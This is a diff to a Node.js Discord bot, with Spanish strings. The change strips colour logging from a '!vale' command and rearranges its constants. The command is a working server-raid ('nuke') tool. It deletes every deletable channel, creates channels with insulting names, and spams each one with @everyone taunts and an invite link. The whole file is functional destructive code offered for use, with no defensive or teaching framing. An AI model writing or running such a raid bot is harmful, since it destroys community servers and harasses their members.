@@ -1,7 +1,6 @@
 require('dotenv').config();
 
 const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
-const chalk = require('chalk');
 
 const client = new Client({
   intents: [
@@ -13,12 +12,12 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const OWNER_IDS = ["1436516806842912970"]; // TU ID REAL
+const OWNER_IDS = ["1436516806842912970"];
 
 client.once('ready', () => {
-  console.log(chalk.bold.green(`Bot conectado como ${client.user.tag}`));
-  console.log(chalk.yellow('Prefijo: ' + PREFIX));
-  console.log(chalk.cyan('Comando !vale disponible solo para owners'));
+  console.log(`Bot conectado como ${client.user.tag}`);
+  console.log('Prefijo: ' + PREFIX);
+  console.log('Comando !vale disponible solo para owners');
 });
 
 client.on('messageCreate', async (message) => {
@@ -33,29 +32,6 @@ client.on('messageCreate', async (message) => {
       return message.reply('No tienes permiso para este comando tan heavy.');
     }
 
-    const nombresDeCanales = [
-      "raid-for-$pwm$-jajaja",
-      "raid-for-$pwm$-jajaja",
-      "raid-for-$pwm$-jajaja",
-      "raid-for-$pwm$-jajaja",
-      "you-are-idiot-owned-by-vale",
-      "you-are-idiot-owned-by-vale",
-    ];
-
-    const mensajesEnRafaga = [
-      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
-      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
-      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
-      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
-    ];
-
-    const delayEntreMensajes = 1300;
-
     try {
       await message.reply(
         `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
@@ -68,7 +44,6 @@ client.on('messageCreate', async (message) => {
 
       const guild = message.guild;
 
-      // 1. Borrar canales
       let borrados = 0;
       for (const ch of guild.channels.cache.values()) {
         if (ch.deletable && ch.id !== message.channel.id) {
@@ -81,12 +56,31 @@ client.on('messageCreate', async (message) => {
       }
       await message.channel.send(`→ Borrados **${borrados}** canales.`);
 
-      // 2. Crear canales
+      const nombresDeCanales = [
+        "raid-for-$pwm$-jajaja",
+        "raid-for-$pwm$-jajaja",
+        "raid-for-$pwm$-jajaja",
+        "raid-for-$pwm$-jajaja",
+        "you-are-idiot-owned-by-vale",
+        "you-are-idiot-owned-by-vale",
+      ];
+
+      const mensajesEnRafaga = [
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
+        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
+        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
+        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+      ];
+
       const nuevosCanales = [];
       for (const nombreOriginal of nombresDeCanales) {
         try {
-          let nombre = nombreOriginal
-            .toLowerCase()
+          let nombre = nombreOriginal.toLowerCase()
             .replace(/[^a-z0-9- ]/g, '-')
             .replace(/\s+/g, '-')
             .replace(/-+/g, '-')
@@ -102,33 +96,32 @@ client.on('messageCreate', async (message) => {
           });
 
           nuevosCanales.push(canal);
-          console.log(chalk.green(`Creado → #${canal.name}`));
+          console.log(`Creado → #${canal.name}`);
           await new Promise(r => setTimeout(r, 900));
         } catch (err) {
-          console.log(chalk.red(`Fallo creando "${nombreOriginal}": ${err.message}`));
+          console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
         }
       }
       await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
 
-      // 3. Spam
       let spameados = 0;
       for (const canal of nuevosCanales) {
         try {
           for (const msg of mensajesEnRafaga) {
             await canal.send(msg);
-            console.log(chalk.blue(`Enviado a #${canal.name}`));
-            await new Promise(r => setTimeout(r, delayEntreMensajes));
+            console.log(`Enviado a #${canal.name}`);
+            await new Promise(r => setTimeout(r, 1300));
           }
           spameados++;
         } catch (err) {
-          console.log(chalk.yellow(`Problema en #${canal.name}: ${err.message}`));
+          console.log(`Problema en #${canal.name}: ${err.message}`);
         }
       }
 
       await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);
 
     } catch (err) {
-      console.error(chalk.bold.red('Error en !vale:'), err);
+      console.error('Error en !vale:', err);
       await message.channel.send('Error grave. Revisa logs.').catch(() => {});
     }
   }
@@ -139,5 +132,5 @@ client.on('messageCreate', async (message) => {
 });
 
 client.login(process.env.TOKEN).catch(err => {
-  console.error(chalk.bold.red('Error al conectar:'), err.message || err);
+  console.error('Error al conectar:', err.message || err);
 });
